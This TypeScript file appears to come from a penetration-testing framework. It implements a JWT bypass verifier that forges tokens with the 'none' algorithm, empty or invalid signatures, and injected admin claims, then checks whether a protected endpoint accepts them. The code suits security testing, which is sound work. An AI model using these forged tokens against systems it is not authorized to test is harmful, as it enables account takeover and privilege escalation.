import type { BrowserEngine } from "../engine"
import type { VerificationScenario, VerifierResult, EvidencePackage } from "../types"
import { Confidence } from "../../shared/types"
import type { EvidenceCollector } from "../../evidence/collector"
import { randomUUID, createHash } from "crypto"
import { tmpdir } from "os"
import { join } from "path"
import { existsSync, mkdirSync, rmSync } from "fs"

/**
 * JWT Verifier — tests for JWT authentication bypass vulnerabilities.
 *
 * Strategy:
 * 1. Extract or generate a JWT for the target application
 * 2. Swap the JWT algorithm to "none"
 * 3. Tampers with the payload (e.g., escalate privileges)
 * 4. Confirm the server accepts the tampered token
 */
export class JWTVerifier implements VerificationScenario {
  name = "jwt"
  description = "JWT Authentication Bypass — tests algorithm none, payload tampering, and signature bypass"

  private logs: string[] = []
  private jwtBypassable = false
  private noneAlgorithmAccepted = false
  private payloadTamperSucceeded = false
  private capturedScreenshots: { data: Buffer; label: string }[] = []
  private capturedResponses: string[] = []
  private capturedRequests: string[] = []
  private harDir: string | null = null
  private testResults: { test: string; status: number; bodyPreview: string; passed: boolean }[] = []

  // Common admin/privileged claims to inject
  private static readonly PRIVILEGE_CLAIMS = [
    { role: "admin" },
    { role: "administrator" },
    { role: "superuser" },
    { admin: true },
    { isAdmin: true },
    { is_superuser: true },
    { privileges: ["admin"] },
    { groups: ["administrators"] },
  ]

  constructor(
    private engine: BrowserEngine,
    private targetUrl: string,
    private protectedEndpoint: string,  // Endpoint requiring JWT auth
    private originalToken?: string,     // Original JWT if available from findings
    private collector?: EvidenceCollector,
    private engagementId?: string,
    private findingId?: string,
  ) {}

  async setup(): Promise<void> {
    await this.engine.launch()
    this.harDir = join(tmpdir(), `argus-har-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`)
    mkdirSync(this.harDir, { recursive: true })
    this.logs.push(`JWT verifier setup complete — target: ${this.targetUrl}`)
  }

  async cleanup(): Promise<void> {
    await this.engine.close()
    if (this.harDir && existsSync(this.harDir)) {
      try { rmSync(this.harDir, { recursive: true, force: true }) } catch { /* best-effort */ }
    }
  }

  async execute(): Promise<void> {
    const protectedUrl = this.protectedEndpoint.startsWith("http")
      ? this.protectedEndpoint
      : `${this.targetUrl.replace(/\/+$/, "")}/${this.protectedEndpoint.replace(/^\//, "")}`

    // Test 1: Original token (if available)
    if (this.originalToken) {
      await this.testToken(this.originalToken, "original-token", protectedUrl)
    }

    // Test 2: Algorithm "none" attacks
    await this.testToken(createNoneAlgorithmToken(), "alg-none", protectedUrl)

    // Test 3: Tampered payload with original signature
    const tamperedTokens = createTamperedTokens(this.originalToken)
    for (let i = 0; i < tamperedTokens.length; i++) {
      await this.testToken(tamperedTokens[i], `tampered-payload-${i + 1}`, protectedUrl)
    }

    // Test 4: Empty signature
    await this.testToken(createTokenWithEmptySignature(), "empty-sig", protectedUrl)

    this.logs.push(`JWT ${this.jwtBypassable ? "BYPASSABLE" : "not bypassable"} — none_alg=${this.noneAlgorithmAccepted}, tamper=${this.payloadTamperSucceeded}`)
  }

  private async testToken(token: string, testLabel: string, protectedUrl: string): Promise<void> {
    await this.engine.createContext({ harDir: this.harDir ?? undefined } as any)
    const page = await this.engine.navigate(this.targetUrl)
    try {
      // Inject the JWT as a bearer token in subsequent requests
      await page.evaluate((t) => {
        localStorage.setItem("token", t)
        localStorage.setItem("access_token", t)
        localStorage.setItem("jwt", t)
      }, token)

      this.capturedRequests.push(`JWT test "${testLabel}": accessing ${protectedUrl}`)

      // Try to access the protected endpoint with the tampered token
      const response = await page.goto(protectedUrl, { waitUntil: "networkidle", timeout: 15000 }).catch(() => null)
      const status = response?.status() ?? 0
      const bodyText = await page.textContent("body").catch(() => "")

      this.capturedResponses.push(`JWT test "${testLabel}": HTTP ${status}`)

      // Success = not rejected (anything except 401/403)
      const accepted = status !== 401 && status !== 403 && status > 0

      this.testResults.push({ test: testLabel, status, bodyPreview: (bodyText ?? "").slice(0, 300), passed: accepted })

      if (testLabel === "alg-none" && accepted) {
        this.noneAlgorithmAccepted = true
        this.jwtBypassable = true
        this.logs.push(`JWT bypass: "alg:none" accepted — HTTP ${status}`)
      }

      if (testLabel.startsWith("tampered-payload") && accepted) {
        this.payloadTamperSucceeded = true
        this.jwtBypassable = true
        this.logs.push(`JWT bypass: tampered payload accepted — HTTP ${status}`)
      }

      try {
        const shot = await this.engine.captureScreenshot(page)
        this.capturedScreenshots.push({ data: shot, label: `jwt-${testLabel}` })
      } catch { /* best-effort */ }
    } finally {
      await page.close()
    }
  }

  async verify(): Promise<VerifierResult> {
    const passed = this.jwtBypassable
    const successfulTests = this.testResults.filter(r => r.passed)

    const summary = passed
      ? this.noneAlgorithmAccepted
        ? `JWT bypass confirmed: algorithm "none" accepted on ${this.protectedEndpoint}`
        : `JWT bypass confirmed: ${successfulTests.length} tampered token(s) accepted on ${this.protectedEndpoint}`
      : `JWT not bypassable: All ${this.testResults.length} token manipulations rejected (401/403)`

    return {
      passed,
      confidence: passed && this.noneAlgorithmAccepted ? Confidence.HIGH
        : passed ? Confidence.MEDIUM
        : Confidence.INFORMATIONAL,
      evidence: [],
      summary,
    }
  }

  async collectEvidence(): Promise<EvidencePackage> {
    const collectedArtifacts: import("../../evidence/types").ArtifactEntry[] = []
    let computedHash = ""
    if (this.collector && this.engagementId && this.findingId) {
      for (const shot of this.capturedScreenshots) {
        const entry = await this.collector.captureScreenshot(this.engagementId, this.findingId, shot.data).catch(() => null)
        if (entry) collectedArtifacts.push(entry)
      }
      for (const req of this.capturedRequests) {
        const entry = await this.collector.saveRequest(this.engagementId, this.findingId, req).catch(() => null)
        if (entry) collectedArtifacts.push(entry)
      }
      for (const res of this.capturedResponses) {
        const entry = await this.collector.saveResponse(this.engagementId, this.findingId, res).catch(() => null)
        if (entry) collectedArtifacts.push(entry)
      }
      if (this.harDir) {
        const harArtifacts = await this.collector.ingestHarFiles(this.engagementId, this.findingId, this.harDir).catch(() => [])
        collectedArtifacts.push(...harArtifacts)
      }
      const manifest = await this.collector.createPackage(this.engagementId, this.findingId, collectedArtifacts).catch(() => null)
      if (manifest) computedHash = manifest.package_hash
    }

    if (!computedHash && collectedArtifacts.length > 0) {
      const hashInput = collectedArtifacts.map((a) => a.hash || a.path).join("")
      computedHash = createHash("sha256").update(hashInput).digest("hex")
    }

    return {
      packageId: randomUUID(),
      findingId: this.findingId ?? "",
      artifacts: collectedArtifacts.length > 0
        ? collectedArtifacts.map((a) => ({ path: a.path, type: a.type, hash: a.hash }))
        : [
            ...this.capturedScreenshots.map((s) => ({ path: `jwt-${s.label}.png`, type: "screenshot" as const })),
            ...this.capturedRequests.map((r) => ({ path: r, type: "request" as const })),
            ...this.capturedResponses.map((r) => ({ path: r, type: "response" as const })),
          ],
      packageHash: computedHash,
      createdAt: new Date().toISOString(),
    }
  }
}

/**
 * Create a JWT with algorithm "none" and empty signature.
 */
function createNoneAlgorithmToken(): string {
  const header = Buffer.from(JSON.stringify({ alg: "none", typ: "JWT" })).toString("base64url")
  const payload = Buffer.from(JSON.stringify({ sub: "admin", role: "admin", iat: Math.floor(Date.now() / 1000) })).toString("base64url")
  return `${header}.${payload}.`
}

/**
 * Create a JWT with empty signature.
 */
function createTokenWithEmptySignature(): string {
  const header = Buffer.from(JSON.stringify({ alg: "HS256", typ: "JWT" })).toString("base64url")
  const payload = Buffer.from(JSON.stringify({ sub: "admin", role: "admin", iat: Math.floor(Date.now() / 1000) })).toString("base64url")
  return `${header}.${payload}.`
}

/**
 * Create tampered JWT tokens by modifying the payload with various privilege claims
 * while keeping the original header and signature.
 */
function createTamperedTokens(originalToken?: string): string[] {
  const tokens: string[] = []

  for (const claims of JWTVerifier.PRIVILEGE_CLAIMS) {
    const payload = Buffer.from(JSON.stringify({ sub: "admin", ...claims, iat: Math.floor(Date.now() / 1000) })).toString("base64url")

    if (originalToken) {
      // If we have an original token, keep its header and signature
      const parts = originalToken.split(".")
      if (parts.length === 3) {
        tokens.push(`${parts[0]}.${payload}.${parts[2]}`)
      }
    }

    // Also try with "none" algorithm and tampered payload
    const headerNone = Buffer.from(JSON.stringify({ alg: "none", typ: "JWT" })).toString("base64url")
    tokens.push(`${headerNone}.${payload}.`)

    // Try with invalid signature (empty)
    const headerHS256 = Buffer.from(JSON.stringify({ alg: "HS256", typ: "JWT" })).toString("base64url")
    tokens.push(`${headerHS256}.${payload}.INVALIDSIG`)
  }

  return tokens
}
